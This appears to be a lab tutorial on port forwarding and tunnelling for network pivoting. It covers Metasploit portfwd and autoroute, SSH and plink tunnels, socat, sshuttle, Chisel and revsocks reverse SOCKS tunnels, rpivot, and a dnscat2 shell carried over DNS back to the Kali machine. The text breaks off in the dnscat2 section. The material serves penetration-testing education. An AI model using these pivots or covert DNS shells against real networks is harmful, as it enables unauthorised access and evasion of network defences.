In this article, we are going to learn about the concepts and techniques of Port forwarding and Tunnelling. This article stands as an absolute cheatsheet on the two concepts.

Port forwarding transmits a communication request from one address and the port number while sending the packets in a network. Tunnelling has proven to be highly beneficial as it lets an organisation create their Virtual Private Network with the help of the public network and provide huge cost benefits for users on both the end.

### **Table of Content**

-   **Apache Virtual Host**
-   **Lab Configuration**
-   **Port Forwarding**
    -   Port Forwarding using Metasploit
    -   SSH Local Port Forwarding (SSH Tunneling)
    -   Port Forwarding using Socat
-   **Tunnelling**
    -   Tunnelling using Sshuttle
    -   Tunnelling using Chisel
    -   Chisel using Socks5 Proxy
    -   Rpivot using Socks4 Proxy
    -   Dynamic SSH Tunnelling
    -   Local SSH Tunneling
    -   Local SSH tunnelling using plink.exe
    -   Dynamic SSH tunnelling using plink.exe
    -   Tunnelling using Revsocks
    -   Metasploit (socks5 and socks4a)
    -   Tunnelling with DNScat2
    -   ICMP tunnelling
-   **Conclusion**

### **Apache Virtual Host**

Virtual Web hosting is a concept which you may have come across in various Capture-the-Flags challenges and lately it is also being used by the professionals in the corporate environment to host their common services under a lesser number of IP address.

Virtual web hosting can be defined as a method of running several web servers on a single host. By using this method, one computer can host thousands of websites. The Apache web servers have become one of the most popular web-serving methods as they are extremely prevailing and supple.

The Apache has the potential to customise itself into a virtual host which allows hosting an individual website. This essentially lets the network administrators make use of a single server to host various websites or domains. This functions extremely smooth till one’s server can bear the load of the multiple servers being hosted.

### **Lab Configuration**

The lab requirements comprise of:

-   VMware Workstation
-   Ubuntu
-   Kali Linux

Let us start with configuring Apache2 services.  To do this you will need to have Apache installed in your Linux systems. You can install it using

```
apt install apache2
```

![](https://i0.wp.com/1.bp.blogspot.com/-yM1lX6YPG8k/YBhAVO3JEuI/AAAAAAAAtN0/6iO4XR6DEgU9cgqtWb9WSZDI4oiDH3lrQCLcBGAsYHQ/s16000/1.png?w=640&ssl=1)

Then we need to create a directory for the websites we have to host.

```
mkdir /sbin/test
```

Then go to the **/etc/apache2** directory and edit the file **ports.conf** and add ‘**Listen 127.0.0.1:8080**‘ before ‘Listen 80’ as in the image below.

```
cd /etc/apache2
nano ports.conf
cat ports.conf
```

![](https://i0.wp.com/1.bp.blogspot.com/-u4nJRotsUjw/YBhAk-nAIpI/AAAAAAAAtN8/1lcUQpk8RDQIQ-YWkzeT7oLTwTIPrPcnACLcBGAsYHQ/s16000/2.png?w=640&ssl=1)

Now let us create the **test.conf** file and add the following code in **/etc/apache2/sites-available/**

```
nano /etc/apache2/sites-available/test.conf
```

```
<VirtualHost 127.0.0.1:8080>
  DocumentRoot /sbin/test/
  ServerName  localhost
  AllowEncodedSlashes NoDecode
  <Directory "/sbin/test/">
    Require all granted
    AllowOverride All
    Options FollowSymLinks MultiViews
  </Directory>
</VirtualHost>
```

![](https://i0.wp.com/1.bp.blogspot.com/-UoAVYzogkpE/YBhAqTcYOjI/AAAAAAAAtOA/lcJ14tbyw2g6qH-hE3TsUDMC6LXHgmtFACLcBGAsYHQ/s16000/3.png?w=640&ssl=1)

Now let us make use the tool **a2ensite** to enable our website and the let us restart our apache2.

```
a2ensite test.conf
systemctl restart apache2
```

Therefore, here we finish the setup of our lab by creating a virtual host.

### **Port Forwarding**

Port forwarding is establishing a secure connection between a remote user and local machines. In organisations on can give their source and destination port numbers to make use of tunnelling with the help of Linux. Along with this, they should also mention the destination which can be the IP address or name of the host.

Let’s switch on the Kali Linux machine and check if the webpage is being hosted. But here it shows that it is unavailable. So, to let us see how the local address and port can be forwarded to the remote host. This can be achieved using various methods, so let’s see them one-by-one.

![](https://i0.wp.com/1.bp.blogspot.com/-wLtyuhH9j2k/YBhAwFohjcI/AAAAAAAAtOE/_p4t2eHFuiw22d9iRzrAJjmHBMuumulMwCLcBGAsYHQ/s16000/4.png?w=640&ssl=1)

**Port Forwarding using Metasploit**

Now we take SSH session using Metasploit. Here we get the meterpreter session and then on using **netstat** command, we observe that port 8080 is running on the local host.

```
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.1.108
set username raj
set password 123
exploit
sessions -u 1
sessions 2
netstat -antp
```

![](https://i0.wp.com/1.bp.blogspot.com/-nZsdwRMmUqY/YBhA3ldcxBI/AAAAAAAAtOM/J99aY08JDJA-oGTSqJtOy5xLO5ckTVMMwCLcBGAsYHQ/s16000/5.png?w=640&ssl=1)

Here we make use of **portfwd** to forward all the traffic to the Kali machine, where you mention the local and the remote port and the local address.

```
portfwd add -l 8081 -p 8080 -r 127.0.0.1
```

![](https://i0.wp.com/1.bp.blogspot.com/-4ItH2mPX9UU/YBhA9xISh-I/AAAAAAAAtOU/8inOP3_NOK0WNoLngxJBXgwuFLsYy5ZUgCLcBGAsYHQ/s16000/6.png?w=640&ssl=1)

When we load this page on the web browser using 127.0.0.1:8081 in the Kali machine, we see that the contents of the web page are displayed.

![](https://i0.wp.com/1.bp.blogspot.com/-FR3gXA46eQY/YBhBHXW_KSI/AAAAAAAAtOc/S6AjjCwtfaIswVQOQLEkrF3Sbgezx_l4QCLcBGAsYHQ/s16000/7.png?w=640&ssl=1)

**SSH Local Port Forwarding**

It is the method used in SSH to forward the ports of application from a client machine to the server machine. By making use of this, the SSH client listens for connections on a port which has been configured, and tunnels to an SSH server when a connection is received. This is how the server connects to a destination port which is configured and is present on a machine other than the SSH server.

This opens a connection to the machine with IP 192.168.1.108 and forwards any connection of port 8080 on the local machine to port 8081. To know more about SSH tunnelling, visit **[here](https://www.hackingarticles.in/comprehensive-guide-on-ssh-tunneling/)**.

```
ssh -L 8081:localhost:8080 -N -f -l raj 192.168.1.108
```

![](https://i0.wp.com/1.bp.blogspot.com/-30tuxA0iI8s/YBhBQASR4cI/AAAAAAAAtOo/QSzVf_6WFWQ1zTIBU4FtMoj_g5IHSUiYACLcBGAsYHQ/s16000/8.png?w=640&ssl=1)

Here we can see that the contents of the web page are displayed when we load this page on the web browser using 127.0.0.1:8081 in the Kali machine.

![](https://i0.wp.com/1.bp.blogspot.com/-I4S1L9WG5m8/YBhBX4YJEYI/AAAAAAAAtOw/8M2oArEjmsY2KIj_sUm-1QQEQc5QDnLRACLcBGAsYHQ/s16000/9.png?w=640&ssl=1)

**Port Forwarding using Socat**

Socat is generally a command-line utility in the Linux which is used to transfer data between two hosts. Here we use it for port forwarding where all the TCP connections to 127.0.0.1:8080 will be redirected to port 1234.

```
socat TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080 &
```

![](https://i0.wp.com/1.bp.blogspot.com/-2VVaR0mkc5c/YBhBdnxxDdI/AAAAAAAAtO0/NQm1td0o2AsPsXBOR8u2vYXLfRMq0KHlwCLcBGAsYHQ/s16000/10.png?w=640&ssl=1)

When we load this page on the web browser using 192.168.1.108:1234 in the Kali machine, we see that the contents of the web page are displayed.

![](https://i0.wp.com/1.bp.blogspot.com/-trq3sLY3kFE/YBhBjE40AaI/AAAAAAAAtO8/J78W21mMXkoFFmbCW9yS4woqZ5zMfKtUwCLcBGAsYHQ/s16000/11.png?w=640&ssl=1)

### **Tunnelling**

Tunnelling is the process of accessing resources remotely using the public network. The tunnels which are established are point-to-point and remote users can be linked at the other end of the tunnels. The job of the tunnelling protocols is to encapsulate the traffic from a user situated remotely and it is sent to the other end of the public network which is then decapsulated and sent to its destined user. The tunnel by default is not encrypted and its level of security is determined with the help of TCP/IP protocol that has selected.

Let us look at how we can perform Tunnelling using various methods and tools.

### **Lab Requirements**

-   Kali Linux with IP address **192.168.1.2**
-   Ubuntu with 2 NIC, consisting of two IP addresses – **192.68.1.108, 192.168.226.128**
-   Metasploitable 2 with IP address **192.168.226.129**

![](https://i0.wp.com/1.bp.blogspot.com/-bPwjsc6BNLU/YBjrmr-mHiI/AAAAAAAAtVw/vGkwBwqyqwopoGwu8CeKynI0z-o0Sr7fACLcBGAsYHQ/s16000/12.png?w=640&ssl=1)

### **Sshuttle**

Sshuttle facilitates to generate a VPN connection from a local machine to a remote Kali Linux with the help of SSH. For the proper functioning, one must have root access on the local machine but the remote Kali Linux can have any type of account. Sshuttle can run more than once concurrently on a particular client machine.

Let’s see how we can use Sshuttle to get the access of a Metasploitable 2 machine which has a different subnet using Ubuntu machine which has two internet addresses with different subnets but also has the subnet in which the Kali Linux is present.

Now let’s check the IP addresses of the Kali Linux machine

![](https://i0.wp.com/1.bp.blogspot.com/-ahy5UgLZGfY/YBhB17GsdrI/AAAAAAAAtPQ/Y8NnB0-lmucvW62kbwY7l7VWxQ03TWY2gCLcBGAsYHQ/s16000/50.png?w=640&ssl=1)

On checking the IP address of the Ubuntu machine we see that it has two IP addresses with different subnets.

![](https://i0.wp.com/1.bp.blogspot.com/-wWjWQ_VvyDI/YBhB7hsohuI/AAAAAAAAtPU/m3J1h87OPpkLuO_Uqm0vHZ2qAgNCjJrNQCLcBGAsYHQ/s16000/51.png?w=640&ssl=1)

Let’s install the tool **Sshuttle** in the Kali Linux machine.

```
apt install sshuttle
```

![](https://i0.wp.com/1.bp.blogspot.com/-jfwnITF8cR8/YBhCBUGUScI/AAAAAAAAtPc/GBfNpjlz4CYFZawymDw2cqxWAhsW39SigCLcBGAsYHQ/s16000/52.png?w=640&ssl=1)

A connection is created remotely with the Ubuntu (raj@192.168.1.108) and then the address of Metasploitable 2(192.168.226.129) using Sshuttle. Mention the password of Ubuntu and hence you are connected.

```
sshuttle -r raj@192.168.1.108 192.168.226.129
```

![](https://i0.wp.com/1.bp.blogspot.com/-87J8_M0ky0w/YBhCI0Tg4qI/AAAAAAAAtPk/4xRZOp0hhfI3VRsxLcaxQkUbrWXwPnkQgCLcBGAsYHQ/s16000/53.png?w=640&ssl=1)

Subsequently, when you put the Metasploitable 2 IP address in your Kali Linux’s browser, you will able to access the Metasploitable 2 on port 80.

![](https://i0.wp.com/1.bp.blogspot.com/-xEJOZqpt47s/YBhCPNAbtII/AAAAAAAAtPo/eMLJRV9PqLQ1YOgF_1FRoq4kMjKfTndFwCLcBGAsYHQ/s16000/54.png?w=640&ssl=1)

Hence, here we saw that using Sshuttle, we first connected the Kali Linux with Ubuntu. Once the connection with Ubuntu was made, using that, a connection between Kali Linux and Metasploitable 2 was created.  

### **Chisel**

It is a TCP/UDP tunnel, which helps in transporting over and is secured using SSH. It includes both, the client and the Kali Linux. It is generally used in passing through firewalls but can also be used to provide a secure connection to one’s network. Let us see how this works.

First, let us install Chisel and golang in our Kali Linux machines.

**Note**: Golang is the programming language in which Chisel has been written, so for proper functioning we also install golang.

```
git clone https://github.com/jpillora/chisel.git
apt install golang
```

![](https://i0.wp.com/1.bp.blogspot.com/-2L_UsUL9Nok/YBhCXWTHzeI/AAAAAAAAtPw/bzplKzi9dh8Iicxa3U-qQykepIKxbUHvACLcBGAsYHQ/s16000/60.png?w=640&ssl=1)

Now as we now have a copy of the chisel source, we can now proceed to build our binaries for Linux land hence compile the packages of the chisel using go build to begin.

```
go build -ldflags="-s -w"
```

![](https://i0.wp.com/1.bp.blogspot.com/-ZuA5jNRbTh8/YBhCeLVvAfI/AAAAAAAAtP4/KDcWOLZAEQ8nWU13sipa5eupZGwPm4kwwCLcBGAsYHQ/s16000/61.png?w=640&ssl=1)

To listen on port 8000 on the Kali Linux and allow clients to specify reverse port forwarding. Here the reverse tunnelling has been activated.

```
./chisel server -p 8000 --reverse
```

![](https://i0.wp.com/1.bp.blogspot.com/-cp_oFepjLh4/YBhCky04UvI/AAAAAAAAtQA/Naf_zlVbvJ0Y3MEONlqrsEsDVqJL2dMAgCLcBGAsYHQ/s16000/62.png?w=640&ssl=1)

**Install Chisel on Ubuntu**

Now let us install chisel and golang on Ubuntu, and compile all the packages.

```
git clone https://github.com/jpillora/chisel.git
apt install golang
cd chisel/
go build -ldflags="-s -w"
```

![](https://i0.wp.com/1.bp.blogspot.com/-ewKy4qXYekI/YBhCre5mFkI/AAAAAAAAtQI/_v98Rt_5TIIACvFkVsLnPPIKORF-qM19QCLcBGAsYHQ/s16000/63.png?w=640&ssl=1)

After this done, let’s run chisel on Ubuntu to connect Kali Linux and Metasploitable 2.

```
./chisel client 192.168.1.2:8000 R:5000:192.168.226.129:80
```

![](https://i0.wp.com/1.bp.blogspot.com/-I4cDb8mSGNQ/YBhCyD7trtI/AAAAAAAAtQM/dUkh94YWbSscf3DgaVVcWi_99UP3nRapgCLcBGAsYHQ/s16000/64.png?w=640&ssl=1)

Open the web browser in the Kali Linux machine to check the connection between the Kali Linux and Metasploitable 2 which is created on the local address and port 5000.

```
http://127.0.0.1:5000
```

**![](https://i0.wp.com/1.bp.blogspot.com/-srCDIUqRtsg/YBhC4LPSP-I/AAAAAAAAtQU/yEXT2YdntQQufQ9QFniFKeYyAXBnK6FngCLcBGAsYHQ/s16000/65.png?w=640&ssl=1)**

**Chisel using Socks5 proxy**

We can follow the initial set-up steps in Ubuntu and Kali Linux as seen in the chisel above proceed ahead.

To listen on port 8000 on the Kali Linux and allow clients to specify reverse port forwarding. Here the reverse tunnelling has been activated.

```
./chisel server -p 8000 --reverse
```

![](https://i0.wp.com/1.bp.blogspot.com/-ZXPPnE7FKtQ/YBhC_oZrVAI/AAAAAAAAtQY/ZetNYcgx9R0wmAJ95uSYOeEEfzfSI5PjQCLcBGAsYHQ/s16000/66.png?w=640&ssl=1)

In ubuntu machine, the next step is to connect to our client using the new reverse socks option.

```
./chisel client 192.168.1.2:8000 R:socks
```

![](https://i0.wp.com/1.bp.blogspot.com/-402I5owqYsg/YBhDH6tsAPI/AAAAAAAAtQk/CEu2NFDzP7AgWKHFeGMn6j9cPJ_k9IUmQCLcBGAsYHQ/s16000/67.png?w=640&ssl=1)

Now we connect the Ubuntu to Metasploitable 2.

```
./chisel client 192.168.1.2:8000 R:8001:192.168.226.129:9001
```

![](https://i0.wp.com/1.bp.blogspot.com/-BGXY9VgN7zE/YBhDR-glVPI/AAAAAAAAtQs/jrzWAaX2sBAxo90WosbVc74fJa-RT35PACLcBGAsYHQ/s16000/68.png?w=640&ssl=1)

Here we point our Socks5 client which is Metasploitable 2 to the Kali Linux using Ubuntu.

```
./chisel server -p 9001 --socks5
```

![](https://i0.wp.com/1.bp.blogspot.com/-3ddKCf-2RU4/YBhDkISAbMI/AAAAAAAAtQ4/yWCUcuSgozIxf8Hg9XHr5JXIcXStcAcLQCLcBGAsYHQ/s16000/69.png?w=640&ssl=1)

Now let’s open the web browser in the Kali Linux and go to configure the **proxy settings**. Here we are manually configuring the proxy, therefore, mention the SOCKS host address as the local address i.e., 127.0.0.1 and choose **socks5 proxy** on port 1080. Also, mention the local address in the ‘**no proxy for**’ box.

![](https://i0.wp.com/1.bp.blogspot.com/-61FMZz1UyUY/YBhDsy4H0nI/AAAAAAAAtQ8/bBgWLtla8csX9YYux-upKhD48rOZx9x-gCLcBGAsYHQ/s16000/70.png?w=640&ssl=1)

When you open the web browser in the Kali Linux machine and add the Metasploitable 2 IP, you see that the Kali Linux is connected to the Metasploitable 2.

![](https://i0.wp.com/1.bp.blogspot.com/-tEXcNXFKQvA/YBhDzLNPPFI/AAAAAAAAtRA/vKWjMzUONccjVkRluPv2Dnk4thvyZwBfACLcBGAsYHQ/s16000/71.png?w=640&ssl=1)

### **Rpivot using Socks4 proxy**

RPIVOT generally provides tunnel traffic into the internal network using socks 4 proxy. Its working is like SSH dynamic port forwarding but is in the opposite direction. It also has a client-server architecture. When a run client on the machine it will tunnel the traffic through and for that the Kali Linux should be enabled so that it can listen to the connections from the client.

Let’s install Rpivot in the Kali Linux machine. Then go to its directory and start the listener on port 9999, which creates socks version 4 proxy on 127.0.0.1 on a port while connecting with the client

```
git clone https://github.com/klsecservices/rpivot.git
python server.py --server-port 9999 --server-ip 192.168.1.2 --proxy-ip 127.0.0.1 --proxy-port 1080
```

![](https://i0.wp.com/1.bp.blogspot.com/-voEAOTZqWoE/YBhD6GsrNMI/AAAAAAAAtRI/rlWwAEP99lo69FvLpg3xrFa3SmcDzsBHQCLcBGAsYHQ/s16000/90.png?w=640&ssl=1)

Now install rpivot in the **Ubuntu** machine and connect it with the Kali Linux

```
git clone https://github.com/klsecservices/rpivot.git
python client.py --server-ip 192.168.1.2 --server-port 9999
```

![](https://i0.wp.com/1.bp.blogspot.com/-lkeCPYzDzfE/YBhEBKDX5LI/AAAAAAAAtRQ/rMwbd1vY3KAUXEOcgTGLvCoEuXNnAuHBACLcBGAsYHQ/s16000/91.png?w=640&ssl=1)

Now go to the web browser in your Kali Linux machine, and **manually configure the proxy**. Set the Socks host address as local address and port as 1080. Select the **Socks version 4** and mention the local address for ’**no proxy for**’.

![](https://i0.wp.com/1.bp.blogspot.com/-MDLR2OeN9dk/YBhEIItNxUI/AAAAAAAAtRU/LpeTEWDN8z8c2dO2R5V8yHN_3HI7W-3_gCLcBGAsYHQ/s16000/92.png?w=640&ssl=1)

Now when you open the web browser in your Kali Linux machine, but the IP address of the Metasploitable 2 and hence you will be able to see the connection.

![](https://i0.wp.com/1.bp.blogspot.com/-2ruGss0nfGI/YBhEObnom5I/AAAAAAAAtRc/7OTKQvtB-XchsIZh3theT2hQUP2T3QNHgCLcBGAsYHQ/s16000/93.png?w=640&ssl=1)

### **Dynamic SSH Tunneling**

Dynamic SSH Tunneling provides a connection with the range of ports by making SSH work like a SOCKS proxy Kali Linux.  A SOCKS proxy is an SSH tunnel where applications send their traffic using a tunnel where the proxy sends it traffic like how it is sent to the internet. In SOCKS proxy, it is mandatory to configure the individual client. Dynamic Tunneling can receive connections from numerous ports.

In Kali Linux machine let’s run the command to connect with the Ubuntu using Dynamic SSH tunnelling.

```
ssh -D 7000 raj@192.168.1.108
```

![](https://i0.wp.com/1.bp.blogspot.com/-ghxadAqCPPk/YBhEVlO7VQI/AAAAAAAAtRk/lEcYdAAOGk05QMj0WvJl3pNvtKGprS0mACLcBGAsYHQ/s16000/150.png?w=640&ssl=1)

Once the connection between the Kali Linux and Ubuntu is made, let’s open the browser in the Kali Linux machine and configure the proxy in the settings. Choose to **manually configure the proxy** and mention the local address as the socks host and the port number as 7000. Now select the **socks version 5** and mention the local address in ‘**no proxy for**’ section.

![](https://i0.wp.com/1.bp.blogspot.com/-MOkaAnOZNRQ/YBhEcVEppaI/AAAAAAAAtRs/V4WFnIyxn_cu-ZVMXX-wvB-ixYyRYC7VACLcBGAsYHQ/s16000/151.png?w=640&ssl=1)

Hence when you put the IP of the Metasploitable 2 in the browser of the Kali Linux, you will have an accessible connection Metasploitable 2 using dynamic Tunnelling.

![](https://i0.wp.com/1.bp.blogspot.com/-k5bkA5SBmI0/YBhEj6G5rII/AAAAAAAAtR0/pJkauDqEwAgbOfaPhL1XvAqmucrEdbycwCLcBGAsYHQ/s16000/152.png?w=640&ssl=1)

### **Local SSH Tunneling**

Here, all the connections which are trying to connect with the Metasploitable 2 using Ubuntu with the local destination and port. The -L indicates the local port.

In the Kali Linux machine, add the localhost and then the Metasploitable 2 username and password to create local SSH tunnelling

```
ssh -L 7000:192.168.22.129:80 raj@192.168.1.108
```

![](https://i0.wp.com/1.bp.blogspot.com/-tLVW0CQ2byk/YBhEseJSQwI/AAAAAAAAtSA/TqVnZeHkAGYdkz3KxYxP7pp-7McQFjOdQCLcBGAsYHQ/s16000/153.png?w=640&ssl=1)

You can open the Kali Linux’s browser and mention the local address along with the port 7000 on which the traffic was transferred.

![](https://i0.wp.com/1.bp.blogspot.com/-2BSNGxEjrms/YBhEzmljq1I/AAAAAAAAtSE/jeqaMTZ742Ed2zHqITiIx4NZgyV1u_aNgCLcBGAsYHQ/s16000/154.png?w=640&ssl=1)

### **Local SSH Tunnelling using Plink.exe**

Here we are making use of command-line in windows machine for tunnelling, where a command-line tool for Putty is being used called plink.exe. Here all the connections which are trying to connect with the Metasploitable 2 using Ubuntu with the local destination and port.

```
plink.exe -L 7000:192.168.226.129:80 raj@192.168.1.108
```

![](https://i0.wp.com/1.bp.blogspot.com/-j738NV7q4A0/YBhE8IgsdTI/AAAAAAAAtSI/cub94WlGhmAp1_dlRvrATkYxLP1c8sbKACLcBGAsYHQ/s16000/155.png?w=640&ssl=1)

Now open the web browser in the window’s machine and put the local address and the port 7000 on which the traffic of Metasploitable 2 was forwarded. You see that there was local SSH Tunnelling between Metasploitable 2 and the Kali Linux using plink.exe

![](https://i0.wp.com/1.bp.blogspot.com/-HSFBaTaSPQ0/YBhFENQ40wI/AAAAAAAAtSQ/KcH6KYGbBW4tO1AM7Ii4sE76YFainXncACLcBGAsYHQ/s16000/156.png?w=640&ssl=1)

### **Dynamic SSH Tunneling using Plink.exe**

Plink.exe is the windows command line for putty in the windows machine which we will use for Dynamic Tunneling can receive connections from numerous ports.

In Kali Linux machine let’s run the command to connect with the Ubuntu using Dynamic SSH tunnelling.

```
plink.exe -D 8000 raj@192.168.1.108
```

![](https://i0.wp.com/1.bp.blogspot.com/-m6eTfOdDOxg/YBhFLlDeo6I/AAAAAAAAtSY/bnWGSyHzod4rRSyvJhBasxhVXbU6pI5uwCLcBGAsYHQ/s16000/157.png?w=640&ssl=1)

Once the connection between the Kali Linux and Ubuntu is established, let us open the browser in the Kali Linux machine and configure the proxy in the settings. Choose to manually configure the proxy and mention the local address as the socks host and the port number as 8000. Now select the **socks version 5** and mention the local address in ‘**no proxy for**’ section.

**![](https://i0.wp.com/1.bp.blogspot.com/-1kPLbOeOgrc/YBhFe1eND8I/AAAAAAAAtSk/s8wHqcJRkC0OyoPu_Q-i0VJbfhz6zIvFACLcBGAsYHQ/s16000/158.png?w=640&ssl=1)**

Hence when you put the IP of the Metasploitable 2 in the browser of the Kali Linux, you will have an accessible connection Metasploitable 2 using dynamic SSH tunnelling with the help of plink.exe.

**![](https://i0.wp.com/1.bp.blogspot.com/-dfEeSZkyPeY/YBhFpeufOEI/AAAAAAAAtSo/ycodSR-nE20vPGA3cfh97LKsG_wVR0ISACLcBGAsYHQ/s16000/159.png?w=640&ssl=1)**

### **Tunnelling using Revsocks**

Revsocks stands for Reverse socks5 tunneler. You can download it from **[here](https://github.com/kost/revsocks)** in the windows operating system. Here in the windows system, we are trying to connect with Ubuntu using socks5.

```
revsocks_windows_amd64.exe -listen :8443 -socks 0.0.0.0:1080 -pass test
```

![](https://i0.wp.com/1.bp.blogspot.com/-iElQZKV3h_w/YBhFyKB9sII/AAAAAAAAtSw/E1i22Kl_6hUF29h4xQTI-PlMJn6pAModQCLcBGAsYHQ/s16000/160.png?w=640&ssl=1)

Now let’s open Ubuntu and download revsocks for Linux. Here we connect Ubuntu with Metasploitable 2 and then we move to proxy settings.

```
./revsocks_linux_amd64 -connect 192.168.1.3:8443 -pass test
```

![](https://i0.wp.com/1.bp.blogspot.com/-gvyfr7UxtkA/YBhF6txpy6I/AAAAAAAAtS4/uPM9uqvyZto2w3grjcKxP2XNBBSYlAg1wCLcBGAsYHQ/s16000/161.png?w=640&ssl=1)

Now in the Windows machine, open the browser and open proxy settings. Here, choose to manually configure the manual proxy configuration and mention the local address in the socks host and mention the port number as 1080. Choose the **socks version 5** and then mention the local address in the ’**no proxy for**’ space.

![](https://i0.wp.com/1.bp.blogspot.com/-U9EJalzpAvA/YBhGBYHP-rI/AAAAAAAAtS8/QaOa7uO56x4m9SYHtKczwaMFvI-yX3UlgCLcBGAsYHQ/s16000/162.png?w=640&ssl=1)

When you open the web browser in the Windows machine and mention the IP address of the Metasploitable 2, you will be connected with the Metasploitable 2 using revsocks.

![](https://i0.wp.com/1.bp.blogspot.com/-cDMnA-6rHxk/YBhGLDDCeCI/AAAAAAAAtTI/gx8uN9PSkVIGD5u_BGXEnypSmAXv7LTJQCLcBGAsYHQ/s16000/163.png?w=640&ssl=1)

### **Tunnelling with Metasploit (SOCKS 5 and 4a)**

Here we start Metasploit in the Kali machine. Then a connection is established with Ubuntu using the auxiliary module with the help of SSH. Once the connection is established, a meterpreter session was created. Then we make use of post module with autoroute. The autoroute post module will help create an additional route through the meterpreter which will allow us to dive deeper in the network. Here we will connect with Metasploitable 2. Next, we will use the auxiliary module for socks5. This is now a deprecated module. Set the localhost address and exploit. The auxiliary module will then start running.

```
use post/multi/manage/autoroute
use auxiliary/server/socks5
set srvhost 127.0.0.1
exploit
```

![](https://i0.wp.com/1.bp.blogspot.com/-HH0g4UcbfS4/YBhGUYSpLdI/AAAAAAAAtTQ/_b4kQViQUFg6euUN7APubwTLat6jOf2ZwCLcBGAsYHQ/s16000/164.png?w=640&ssl=1)

Now go to the web browser in the **Kali Linux** machine, open the browser and open **proxy settings**. Here, choose to manually configure the **manual proxy configuration** and mention the local address in the **socks host** and mention the port number as 1080. Choose the **socks version 5** and then mention the local address in the **’no proxy** **for**’ space.

![](https://i0.wp.com/1.bp.blogspot.com/-Gumj3gUrxmE/YBhGdVENsfI/AAAAAAAAtTY/9PP2aG39ABgnX_fVUUxoIpxi22NDKDs-gCLcBGAsYHQ/s16000/165.png?w=640&ssl=1)

 When you open the web browser in the Kali Linux and mention the IP address of the Metasploitable 2, you will be connected with the Metasploitable 2 using Metasploit.

![](https://i0.wp.com/1.bp.blogspot.com/-YTr07AVoVMI/YBhGm5VLEoI/AAAAAAAAtTc/ze99nNVcLgYj43lFIog0VyK2wqafgsOTgCLcBGAsYHQ/s16000/166.png?w=640&ssl=1)

### SOCKS 4a

Now let’s start Metasploit in the Kali machine where the connection is established with Ubuntu with the help of auxiliary module using SSH. Then a meterpreter session was created. Then we will use the post-module where we will use autoroute. The autoroute post module will help to create additional routes through the meterpreter which will allow us to dive deeper in the network. Here we will connect with Metasploitable 2. Next, we will use the auxiliary module for socks4a. This is now a deprecated module. Instead, we can use the new module Set the localhost address and exploit. The auxiliary module will then start running.

```
use post/multi/manage/autoroute
use auxiliary/server/socks4a
set srvhost 127.0.0.1
exploit
```

![](https://i0.wp.com/1.bp.blogspot.com/-iNd9_TDKXBQ/YBhGukMV7wI/AAAAAAAAtTk/i2AS7Ryagwo41RM1vaIdsBIVeJ9kDPW2gCLcBGAsYHQ/s16000/167.png?w=640&ssl=1)

Hence, open the web browser in the Kali Linux machine, and open **proxy settings**. Now, choose to manually configure the **manual proxy configuration** and mention the local address in the socks host and mention the port number as 1080. Choose the **socks version 4a** and then mention the local address in the ’**no proxy for**’ space.

![](https://i0.wp.com/1.bp.blogspot.com/-eTNZl2yADSQ/YBhG1ZteT-I/AAAAAAAAtTo/tQ3ZK-J1feQ2f4VHPkeM9tzvmJD_8dwSACLcBGAsYHQ/s16000/165.png?w=640&ssl=1)

When you open the web browser in the Kali Linux and mention the IP address of the Metasploitable 2, you will be connected with the Metasploitable 2 using Metasploit.

**![](https://i0.wp.com/1.bp.blogspot.com/-pSFSsQvOPyU/YBhG-A1VT9I/AAAAAAAAtT0/kTZi__KCldorhl8vTdFN_FjkdI2709l7wCLcBGAsYHQ/s16000/166.png?w=640&ssl=1)**

### **Tunnelling with DNScat2**

DNScat2 is a tool which can be used to create a tunnel with the help of DNS protocol. A connection to port 53 should be established to access any data. DNScat2 mainly consists of a client and a Kali Linux. In our scenario, we need to establish a connection between Metasploitable 2 and Kali Linux using Ubuntu as the medium.

Let’s begin with installing DNScat2 in the Kali Linux machine using apt install which will automatically build dependencies.

**DNScat2 Tunneling on Port 22**

```
apt install dnscat2
```

![](https://i0.wp.com/1.bp.blogspot.com/-j7kOr-1I3aI/YBhHXv4OsXI/AAAAAAAAtUE/OMkGwpixkj8HdJQWdQHw2bnVNe3KSvTzACLcBGAsYHQ/s16000/100.png?w=640&ssl=1)

Once this is done, the dnscat2 server will start running.

![](https://i0.wp.com/1.bp.blogspot.com/-WT4aGskG4DE/YBhHhpqh8nI/AAAAAAAAtUM/AngC2ADHo0IaKZd9bGs4YEFo-yj9balDACLcBGAsYHQ/s16000/101.png?w=640&ssl=1)

In the Ubuntu machine, we will install dnscat2 using git clone. Here we will have to install the dependencies manually to get the tool started.

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/
cd client/
make
```

![](https://i0.wp.com/1.bp.blogspot.com/-tjIcaw5-9CY/YBhHrAurDpI/AAAAAAAAtUU/4E-otD73W-w2wKttU-AWaU2d9NcVHeudgCLcBGAsYHQ/s16000/102.png?w=640&ssl=1)

Now let’s establish a connection between the Kali Linux and Ubuntu.

```
./dnscat --dns=server=192.168.1.2,port=53
```

![](https://i0.wp.com/1.bp.blogspot.com/-ZEJCm4gXCmA/YBhHxWRsraI/AAAAAAAAtUc/DtdtaOa8uqU9EQ7tfoR-rxq8OqWaPxgqwCLcBGAsYHQ/s16000/103.1.png?w=640&ssl=1)

Once the connection is successfully established, a session will be created on the Kali Linux’s end. Now let us check the sessions that are available and interact with them and then send in a request to create a shell. Once the request is accepted a new window will open and the session 2.

```
session
session -i 1
shell
```

![](https://i0.wp.com/1.bp.blogspot.com/-DSCWwQMrFic/YBhH3jqoqzI/AAAAAAAAtUg/T7TSx6afQL47o46p1i9zbEmD_XZSHIzPgCLcBGAsYHQ/s16000/103.png?w=640&ssl=1)

Using the second session, you now have access to the Ubuntu machine. So now let’s check the IP address of the client one machine. Here we see that Ubuntu has two NIC cards installed within it.

```
session -i 2
ifconfig
```

![](https://i0.wp.com/1.bp.blogspot.com/-PmOrzt7ayCI/YBhH9IYry5I/AAAAAAAAtUk/GC5ZGOc4yHAgR5AUkN13Ai-aeKvpMUHeQCLcBGAsYHQ/s16000/104.png?w=640&ssl=1)

Now we will connect the Metasploitable 2 port 22 to the port 8888 to create a DNS tunnel between them using the shell.

```
listen 127.0.0.1:8888 192.168.226.129:22
```

![](https://i0.wp.com/1.bp.blogspot.com/-AjPfEm3Enag/YBhIDNLYIHI/AAAAAAAAtUo/fuOmXyVf0ZQuPQ06EtWqgAXRliQlNPTMACLcBGAsYHQ/s16000/105.png?w=640&ssl=1)

Open a new tab in the Kali Linux machine and login to the Metasploitable 2 machine with its credentials and now you will be able to communicate with Metasploitable 2 using the Kali Linux.
